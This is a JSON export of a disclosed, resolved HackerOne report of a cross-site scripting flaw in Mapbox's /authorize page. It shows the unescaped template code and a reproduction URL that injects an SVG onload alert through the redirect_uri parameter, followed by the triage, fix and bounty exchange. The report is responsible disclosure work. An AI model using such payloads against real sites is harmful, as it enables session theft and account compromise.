{"id":143220,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDMyMjA=","url":"https://hackerone.com/reports/143220","title":"XSS on www.mapbox.com/authorize","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-06-05T18:00:42.415Z","submitted_at":"2016-06-05T18:00:42.415Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"stefanofinding","url":"/stefanofinding","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1366,"url":"https://hackerone.com/mapbox","handle":"mapbox","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/001/366/d4dfa3c8752e3849cdfb22fea49c17bd37f03850_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/366/d4dfa3c8752e3849cdfb22fea49c17bd37f03850_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Mapbox","twitter_handle":"mapbox","website":"https://www.mapbox.com/security","about":"Mapbox is an open source mapping platform, providing building blocks for developers to integrate location into any mobile or online application."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2017-08-14T17:19:52.016Z","bug_reporter_agreed_on_going_public_at":"2017-08-01T10:17:37.202Z","team_member_agreed_on_going_public_at":"2017-08-14T17:19:51.958Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Description\n---\nWhen you don't include the parameter __client_id__ in the request to the endpoint at https://www.mapbox.com/authorize/, the template __template-modal-unauthorized__ (included in the client code of the endpoint)  is rendered with the value of the parameter __redirect_uri__ sent in the request without escaping:\n```html\nCode at https://www.mapbox.com/authorize/\n\u003c% if (obj.redirect) { %\u003e\n      \u003cdiv class='fill-gray pad2y pad4x center'\u003e\n        \u003ca href='\u003c%= obj.redirect %\u003e' class='button col12 close'\u003eBack\u003c/a\u003e\n      \u003c/div\u003e\n\u003c% } %\u003e\n```\n```javascript\nCode at https://www.mapbox.com/authorize/authorize.js\n}).fail(function(err) {\n        Views.modal.show('unauthorized', {\n            msg: err.statusText,\n            redirect: (App.param('redirect_uri')) ?\n                App.param('redirect_uri') :\n                false\n        });\n});\n```\nThe problem is that you can pass any value to __redirect_uri__ and it is going to be added as HTML code, which allows to break the `\u003ca\u003e` element using a `'` and a `\u003e`.\n\nReproduction\n---\nLoad the following URL on Chrome, Firefox, Safari, Internet Explorer 11, or Edge.\n```\nhttps://www.mapbox.com/authorize/?redirect_uri=%27%3E%3Csvg%20onload=%27alert%28document.domain%29%27%3E\n```\nI'm going to share a link to the video in a comment, because the size is greater than 10MB.\n\n---\n\nLet me know if you need more information.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-08-31T10:17:37.290Z","allow_singular_disclosure_after":-129785040.24124855,"singular_disclosure_allowed":true,"vote_count":12,"voters":["fransrosen","mashoud1122","bl4de","aroly","geeknik","eveeez","japz","sumit7","hacklad","dyabla","and 2 more..."],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":1000437,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Link to the video: https://vimeo.com/169445824.\nPassword: `xssbringtoyoubystefano`.","automated_response":false,"created_at":"2016-06-05T18:04:01.003Z","updated_at":"2016-06-05T18:04:01.003Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1005212,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2016-06-08T19:49:19.744Z","updated_at":"2016-06-08T19:49:19.744Z","actor":{"username":"alulsh","cleared":false,"url":"/alulsh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/856/496b75e2cc4a4ce5798ef27243d139b9dd38fea5_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1222659,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Apologies for the wait on this and on [#143240](https://hackerone.com/reports/143240) @stefanofindsbugs. We just deployed a patch this evening - can you confirm the fix? ","automated_response":false,"created_at":"2016-09-28T22:34:02.316Z","updated_at":"2016-09-28T22:34:02.316Z","actor":{"username":"alulsh","cleared":false,"url":"/alulsh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/856/496b75e2cc4a4ce5798ef27243d139b9dd38fea5_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"stefanofinding","url":"/stefanofinding"},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1222843,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"No worries, I understand that it takes time to patch issues.\nI just confirmed that I can't reproduce the issue anymore.","automated_response":false,"created_at":"2016-09-29T00:49:29.163Z","updated_at":"2016-09-29T00:49:29.163Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1224798,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","automated_response":false,"created_at":"2016-09-29T22:51:06.381Z","updated_at":"2016-09-29T22:51:06.381Z","actor":{"url":"/mapbox","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/366/d4dfa3c8752e3849cdfb22fea49c17bd37f03850_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Mapbox"}},"bounty_amount":"500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"mapbox","collaborator":{"username":"stefanofinding","url":"/stefanofinding"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1224884,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the bounty!","automated_response":false,"created_at":"2016-09-30T00:14:24.592Z","updated_at":"2016-09-30T00:14:24.592Z","actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1881878,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"I would like to disclose this report, it would be great if you agree. Thanks!","automated_response":false,"created_at":"2017-08-01T10:17:37.241Z","updated_at":"2017-08-01T10:17:37.241Z","first_to_agree":true,"actor":{"username":"stefanofinding","cleared":true,"url":"/stefanofinding","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/171/2558843b6d2b90f4dd826a661bcef3fd1abb2906_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1927378,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2017-08-14T17:19:51.979Z","updated_at":"2017-08-14T17:19:51.979Z","actor":{"username":"alulsh","cleared":false,"url":"/alulsh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/856/496b75e2cc4a4ce5798ef27243d139b9dd38fea5_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1927379,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2017-08-14T17:19:52.034Z","updated_at":"2017-08-14T17:19:52.034Z","actor":{"username":"alulsh","cleared":false,"url":"/alulsh","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/039/856/496b75e2cc4a4ce5798ef27243d139b9dd38fea5_original.JPG/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"mapbox","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}